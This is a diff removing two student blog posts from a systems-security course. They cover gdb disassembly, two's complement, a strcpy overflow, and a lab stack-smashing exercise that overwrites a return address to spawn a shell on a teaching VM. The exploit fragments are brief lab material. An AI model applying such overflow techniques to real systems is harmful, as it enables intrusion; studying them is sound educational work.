@@ -261,1007 +261,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/16/SWS/Submission01_en/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Seven ♂">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.JPG">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Seven's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/05/16/SWS/Submission01_en/" itemprop="url">SWS/Submission01_en</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-16T01:45:24+02:00">
-                2020-05-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Submission01-of-SWS"><a href="#Submission01-of-SWS" class="headerlink" title="Submission01 of SWS"></a>Submission01 of SWS</h2><p>关闭了所有的优化选项,否则的话想problem 1中的部分变量都会被优化掉.</p>
-<p>The order of declaration will determine the order of stack. NOT initialization.</p>
-<ul>
-<li>When do we need movl rahter than mov : </li>
-<li>ebp:frame pointer</li>
-<li>ecx: 可能谁需要呢?ecx</li>
-</ul>
-<h4 id="Problem-1-Disassembling-with-gdb"><a href="#Problem-1-Disassembling-with-gdb" class="headerlink" title="Problem 1: Disassembling with gdb"></a>Problem 1: Disassembling with gdb</h4><ol>
-<li>Replace X in Line 5 with the sum of the ASCII codes.</li>
-</ol>
-<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200502005204664.png" alt="image-20200502005204664"></p>
-<ol start="2">
-<li>Compiling and disassembing with gdb</li>
-</ol>
-<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200501212219103.png" alt="image-20200501212219103"></p>
-<ol start="3">
-<li>Retrieve the assembly code of the main function, the corresponding assembly code are commented.</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x08048344 &lt;+0&gt;:	    lea    0x4(%esp),%ecx	</span><br><span class="line">0x08048348 &lt;+4&gt;:	    and    $0xfffffff0,%esp #这是不可逆的哦,所以之前的东西要保存</span><br><span class="line">0x0804834b &lt;+7&gt;:	    pushl  -0x4(%ecx)		#之前esp上的数据</span><br><span class="line">0x0804834e &lt;+10&gt;:	push   %ebp				</span><br><span class="line">0x0804834f &lt;+11&gt;:	mov    %esp,%ebp		</span><br><span class="line">0x08048351 &lt;+13&gt;:	push   %ecx				#回火, 为什么要存,因为只有他有之前esp的信息了</span><br><span class="line">0x08048352 &lt;+14&gt;:	sub    $0x10,%esp		</span><br><span class="line">0x08048355 &lt;+17&gt;:	movl   $0xf3,-0x10(%ebp);Refer to line5 a&#x3D;0xf3;</span><br><span class="line">												;Move value of a to -0x10@(%ebp)</span><br><span class="line">0x0804835c &lt;+24&gt;:	movl   $0x3,-0xc(%ebp)	;Refer to Line6 b&#x3D;3;</span><br><span class="line">0x08048363 &lt;+31&gt;:	mov    -0xc(%ebp),%eax	;Refer to Line7 temp &#x3D; b;</span><br><span class="line">0x08048366 &lt;+34&gt;:	add    -0x10(%ebp),%eax	;Refer to Line7 temp &#x3D; temp+a;</span><br><span class="line">0x08048369 &lt;+37&gt;:	mov    %eax,-0x8(%ebp)	;Refer to Line7 c &#x3D; temp;</span><br><span class="line">0x0804836c &lt;+40&gt;:	mov    $0x0,%eax		</span><br><span class="line">0x08048371 &lt;+45&gt;:	add    $0x10,%esp</span><br><span class="line">0x08048374 &lt;+48&gt;:	pop    %ecx</span><br><span class="line">0x08048375 &lt;+49&gt;:	pop    %ebp</span><br><span class="line">0x08048376 &lt;+50&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">0x08048379 &lt;+53&gt;:	ret</span><br></pre></td></tr></table></figure>
-
-<h4 id="Problem-2-x86-Assembly-Code-I"><a href="#Problem-2-x86-Assembly-Code-I" class="headerlink" title="Problem 2: x86 Assembly Code (I)"></a>Problem 2: x86 Assembly Code (I)</h4><p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200503091753665.png" alt="image-20200503091753665"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483b6 &lt;+0&gt;:		lea    0x4(%esp),%ecx	;copies address esp+4 to ecx</span><br><span class="line">   0x080483ba &lt;+4&gt;:		and    $0xfffffff0,%esp	;alignment</span><br><span class="line">   0x080483bd &lt;+7&gt;:		pushl  -0x4(%ecx)		;push value of @-0x4(%ecx) onto the stack</span><br><span class="line">   0x080483c0 &lt;+10&gt;:	push   %ebp				;save current frame pointer</span><br><span class="line">   0x080483c1 &lt;+11&gt;:	mov    %esp,%ebp		;set %ebp&#x3D;%esp, new frame pointer</span><br><span class="line">   0x080483c3 &lt;+13&gt;:	push   %ecx				;allocate 4 bytes space for local variable</span><br><span class="line">   0x080483c4 &lt;+14&gt;:	sub    $0x14,%esp		;allocate space for local variables</span><br><span class="line">   0x080483c7 &lt;+17&gt;:	movl   $0x0,-0x8(%ebp)	;int x&#x3D; 0</span><br><span class="line">   0x080483ce &lt;+24&gt;:	mov    -0x8(%ebp),%eax	;moves x&#x3D;0 to %eax</span><br><span class="line">   0x080483d1 &lt;+27&gt;:	mov    %eax,(%esp)		;moves x&#x3D;0 @0x0(%esp)</span><br><span class="line">   0x080483d4 &lt;+30&gt;:	call   0x8048374 &lt;myfunction&gt;;call myfunction()</span><br><span class="line">   0x080483d9 &lt;+35&gt;:	add    $0x14,%esp		;esp+0x14</span><br><span class="line">   0x080483dc &lt;+38&gt;:	pop    %ecx				;pop %ecx</span><br><span class="line">   0x080483dd &lt;+39&gt;:	pop    %ebp				;pop %ebp</span><br><span class="line">   0x080483de &lt;+40&gt;:	lea    -0x4(%ecx),%esp	;copies address ecx-4 to esp</span><br><span class="line">   0x080483e1 &lt;+43&gt;:	ret    					;pop %ebp</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of assembler code for function myfunction:</span><br><span class="line">   0x08048374 &lt;+0&gt;:		push   %ebp					;save current frame pointer</span><br><span class="line">   0x08048375 &lt;+1&gt;:		mov    %esp,%ebp			;set %ebp&#x3D;%esp, new frame pointer</span><br><span class="line">   0x08048377 &lt;+3&gt;:		sub    $0x28,%esp			;allocate space for local variables</span><br><span class="line">   0x0804837a &lt;+6&gt;:		movl   $0x2a,-0x4(%ebp)		;some_long:&#x3D; 42</span><br><span class="line">   0x08048381 &lt;+13&gt;:	movl   $0x80484b0,-0xc(%ebp);some_strings[0] &#x3D; &quot;foo&quot;</span><br><span class="line">   0x08048388 &lt;+20&gt;:	movl   $0x80484b4,-0x8(%ebp);some_strings[1] &#x3D; &quot;bar&quot;</span><br><span class="line">   0x0804838f &lt;+27&gt;:	subl   $0x13,-0x4(%ebp)		;some_long -&#x3D; 19;</span><br><span class="line">   0x08048393 &lt;+31&gt;:	mov    -0xc(%ebp),%eax		;%eax:&#x3D;some_strings[0] </span><br><span class="line">   0x08048396 &lt;+34&gt;:	mov    %eax,0xc(%esp)		;mov some_strings[0] @0xc(%esp)</span><br><span class="line">   													;as argument for the &lt;printf&gt;</span><br><span class="line">   0x0804839a &lt;+38&gt;:	mov    0x8(%ebp),%eax		;move argument int a to %eax</span><br><span class="line">   0x0804839d &lt;+41&gt;:	mov    %eax,0x8(%esp)		;move int a @0x8(%esp) for printf</span><br><span class="line">   0x080483a1 &lt;+45&gt;:	mov    -0x4(%ebp),%eax		;move some_long to %eax</span><br><span class="line">   0x080483a4 &lt;+48&gt;:	mov    %eax,0x4(%esp)		;move eax 0x4(%esp for printf</span><br><span class="line">   0x080483a8 &lt;+52&gt;:	movl   $0x80484b8,(%esp)	;pass the address of strng to printf</span><br><span class="line">   0x080483af &lt;+59&gt;:	call   0x80482d8 &lt;printf@plt&gt;;printf</span><br><span class="line">   0x080483b4 &lt;+64&gt;:	leave  						;%esp :&#x3D;ebp%</span><br><span class="line">   0x080483b5 &lt;+65&gt;:	ret    						;pop %ebp</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Problem-3-x86-Assembly-Code-II"><a href="#Problem-3-x86-Assembly-Code-II" class="headerlink" title="Problem 3: x86 Assembly Code (II)"></a>Problem 3: x86 Assembly Code (II)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">blub</span><span class="params">()</span></span>;</span><br><span class="line">    blub();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0x17</span>;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    b = a - <span class="number">0xf</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Problem-4-Two’s-Complement"><a href="#Problem-4-Two’s-Complement" class="headerlink" title="Problem 4: Two’s Complement"></a>Problem 4: Two’s Complement</h4><p>  Attachment below is the source file of this problem.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;conio.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">print_bin</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> s_unsigned;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> s_unsigned_b;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> s_signed;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> s_signed_b;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> x;<span class="comment">//  int x[3]=&#123;'X','H','S'&#125;;</span></span><br><span class="line">  x=<span class="string">'X'</span>+<span class="string">'H'</span>+<span class="string">'S'</span>;</span><br><span class="line">  s_unsigned=x%<span class="number">127</span>+<span class="number">128</span>;</span><br><span class="line">  s_signed=x%<span class="number">127</span>+<span class="number">128</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The value of x is %d\n"</span>,x);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The value of s_unsigned is %d\n"</span>,s_unsigned);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The value of s_signed is %d\n"</span>,s_signed);</span><br><span class="line">  print_bin(s_unsigned);</span><br><span class="line">  print_bin(s_signed);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_bin</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="keyword">sizeof</span>(n)*<span class="number">4</span><span class="number">-1</span>; i&gt;=<span class="number">0</span>; i --)<span class="comment">//Attention in ANSI C - sizeof(char) is 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;(<span class="number">1</span>&lt;&lt;i))<span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>Consuming the representation type of the variables is int, whose size is 16 or 32 bits normally , 16 bits in my case.</p>
-<p>The value of x is 243<br>The value of s_unsigned is 244<br>The value of s_signed is 244<br>0000000011110100(Binary representation of s_unsigned )<br>0000000011110100(Binary representation of s_signed )</p>
-</li>
-<li><p>Consuming the representation type of the variables is  short, whose size is 8 bits normally.</p>
-<p>The value of x is 243<br>The value of s_unsigned is 244<br>The value of s_signed is -12<br>11110100(Binary representation of s_unsigned )<br>11110100(Binary representation of s_signed)<br>Unsigned interpretation: $244 = -12 \ mod \ 2^8 = 2^8 - 12$</p>
-</li>
-</ul>
-<h3 id="Problem-5-Buffer-Overflow"><a href="#Problem-5-Buffer-Overflow" class="headerlink" title="Problem 5: Buffer Overflow"></a>Problem 5: Buffer Overflow</h3><p>The result of the given script is shown as below:</p>
-<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200504002751333.png" alt="image-20200504002751333"></p>
-<p>A string  is printed: undvier</p>
-<p>There are several reasons about the solution:</p>
-<ol>
-<li><p>The strcpy(arg1,arg2) may copy the string from arg2 to arg1, until /0 is detected</p>
-<p>part of source code of strcpy()</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcpy</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>; src[i] != <span class="string">'\0'</span>; ++i)</span><br><span class="line">    dest[i] = src[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Ensure trailing null byte is copied</span></span><br><span class="line">  dest[i]= <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>In our case </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> foo[] = <span class="string">"zweiundvier\0zig"</span></span><br></pre></td></tr></table></figure>
-
-<p>so only “zweiundvier” are copied in the process of operation</p>
-<ol start="2">
-<li>buffer2 is too small to capture “zweiundvier”, buffer overflow happens, due to the definition of buffer1, buffer2 and buffer3 are conseqent, “zweiundvier” also cover the data segment of buffer1 and buffer2. And print function show the string until it print \0.</li>
-</ol>
-</li>
-</ol>
-<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200504002617049.png" alt="image-20200504002617049"></p>
-<p>​        In addition, if we print the buffer2 ,buffer3 , it should be:<br>​        buffer1 =’’ vier’, buffer2 = ‘undvier ‘, buffer3 = ‘zweiundvier’</p>
-<p>​     </p>
-<h3 id="Problem-6-Stack-Frames"><a href="#Problem-6-Stack-Frames" class="headerlink" title="Problem 6: Stack Frames"></a>Problem 6: Stack Frames</h3><p>Belwo is the disassembled code: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08048357 &lt;+0&gt;:		lea    0x4(%esp),%ecx</span><br><span class="line">   0x0804835b &lt;+4&gt;:		and    $0xfffffff0,%esp</span><br><span class="line">   0x0804835e &lt;+7&gt;:		pushl  -0x4(%ecx)</span><br><span class="line">   0x08048361 &lt;+10&gt;:	push   %ebp</span><br><span class="line">   0x08048362 &lt;+11&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048364 &lt;+13&gt;:	push   %ecx</span><br><span class="line">   0x08048365 &lt;+14&gt;:	sub    $0x18,%esp</span><br><span class="line">   0x08048368 &lt;+17&gt;:	movl   $0x2a,-0x10(%ebp)</span><br><span class="line">   0x0804836f &lt;+24&gt;:	lea    -0x10(%ebp),%eax</span><br><span class="line">   0x08048372 &lt;+27&gt;:	mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048376 &lt;+31&gt;:	movl   $0x17,(%esp)</span><br><span class="line">   0x0804837d &lt;+38&gt;:	call   0x8048344 &lt;do_something&gt;</span><br><span class="line">   0x08048382 &lt;+43&gt;:	add    $0x18,%esp</span><br><span class="line">   0x08048385 &lt;+46&gt;:	pop    %ecx</span><br><span class="line">   0x08048386 &lt;+47&gt;:	pop    %ebp</span><br><span class="line">   0x08048387 &lt;+48&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">   0x0804838a &lt;+51&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">Dump of assembler code for function do_something:</span><br><span class="line">   0x08048344 &lt;+0&gt;:		push   %ebp</span><br><span class="line">   0x08048345 &lt;+1&gt;:		mov    %esp,%ebp</span><br><span class="line">   0x08048347 &lt;+3&gt;:		sub    $0x10,%esp	;end here?</span><br><span class="line">   0x0804834a &lt;+6&gt;:		mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804834d &lt;+9&gt;:		mov    (%eax),%eax</span><br><span class="line">   0x0804834f &lt;+11&gt;:	add    0x8(%ebp),%eax</span><br><span class="line">   0x08048352 &lt;+14&gt;:	mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x08048355 &lt;+17&gt;:	leave  </span><br><span class="line">   0x08048356 &lt;+18&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_something</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> * b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">  <span class="keyword">int</span> d;</span><br><span class="line"></span><br><span class="line">  c = a + *b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> e;</span><br><span class="line">  <span class="keyword">int</span> f;</span><br><span class="line">  <span class="keyword">int</span> g;</span><br><span class="line"></span><br><span class="line">  e = <span class="number">42</span>;</span><br><span class="line">  </span><br><span class="line">  do_something(<span class="number">23</span>, &amp;e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) backtrace</span><br><span class="line"><span class="meta">#</span><span class="bash">0  do_something (a=23, b=0xffffcd98) at c-stack-example.c:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">1  0x08048382 <span class="keyword">in</span> main () at c-stack-example.c:15</span></span><br><span class="line">(gdb) info frame 0</span><br><span class="line">Stack frame at 0xffffcd8c:</span><br><span class="line"> eip = 0x804834a in do_something (c-stack-example.c:5); saved eip = 0x8048382</span><br><span class="line"> called by frame at 0xffffcdb0</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0xffffcd84, args: a=23, b=0xffffcd98</span><br><span class="line"> Locals at 0xffffcd84, Previous frame's sp is 0xffffcd8c</span><br><span class="line"> Saved registers:</span><br><span class="line">  ebp at 0xffffcd84, eip at 0xffffcd88</span><br><span class="line">  </span><br><span class="line">(gdb) info frame 1</span><br><span class="line">Stack frame at 0xffffcdb0:</span><br><span class="line"> eip = 0x8048382 in main (c-stack-example.c:15); saved eip = 0xf7e09637</span><br><span class="line"> caller of frame at 0xffffcd8c</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0xffffcda8, args: </span><br><span class="line"> Locals at 0xffffcda8, Previous frame's sp at 0xffffcda4</span><br><span class="line"> Saved registers:</span><br><span class="line">  ebp at 0xffffcda8, eip at 0xffffcdac</span><br></pre></td></tr></table></figure>
-
-<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200504001834021.png" alt="image-20200504001834021"></p>
-<p>Ofen used command: </p>
-<p>(gdb) break 5  //number of line in  code/c–stack–example.c</p>
-<p>(gdb) run</p>
-<p>(gdb) backtrace</p>
-<p>(gdb) select-frame 0</p>
-<p>(gdb) info frame</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/15/SWS/Submission02/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Seven ♂">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.JPG">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Seven's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/05/15/SWS/Submission02/" itemprop="url">Submission02 of SWS</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-15T10:44:09+02:00">
-                2020-05-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/theory/" itemprop="url" rel="index">
-                    <span itemprop="name">theory</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Submission02-of-SWS"><a href="#Submission02-of-SWS" class="headerlink" title="Submission02 of SWS"></a>Submission02 of SWS</h2><p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066163/Screenshot_from_2020-05-10_01-14-58_jwd7vo.png" alt=""></p>
-<p>We mimic the way from the example of lectures, insert a printf() as an assistant.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callme</span><span class="params">(<span class="keyword">char</span> *a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> b[<span class="number">255</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address of buffer in exploitable program: %08x\n"</span>, b); <span class="comment">//edited </span></span><br><span class="line">  <span class="built_in">strcpy</span>(b, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>After we compile the target file and execute, we get the 0xbffff759 , and we need to overflow the stack in order to overwrite the  return address , which aligned the 4-bytes to the address  0xbffff759. So we modifed  part of code from the example.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fill whole buffer with the target address, i=3 for align</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">3</span>; i &lt; bsize; i+=<span class="number">4</span>)</span><br><span class="line">  <span class="built_in">memcpy</span>(buff+i, &amp;addr, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589144743/VirtualBox_System_Security_VM_1_10_05_2020_23_04_18_hmw0i4.png" alt=""></p>
-<p>Change the updated address 0xbffff369</p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589144743/VirtualBox_System_Security_VM_1_10_05_2020_23_05_05_ixx08h.png" alt=""></p>
-<p>At last we got the shell.</p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589144743/VirtualBox_System_Security_VM_1_10_05_2020_23_05_25_aaixtc.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066162/Screenshot_from_2020-05-10_01-14-39_xxpea8.png" alt=""></p>
-<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1589066163/Screenshot_from_2020-05-10_01-14-49_nm8nlo.png" alt="-w70" style="zoom:67%;" />
-
-
-
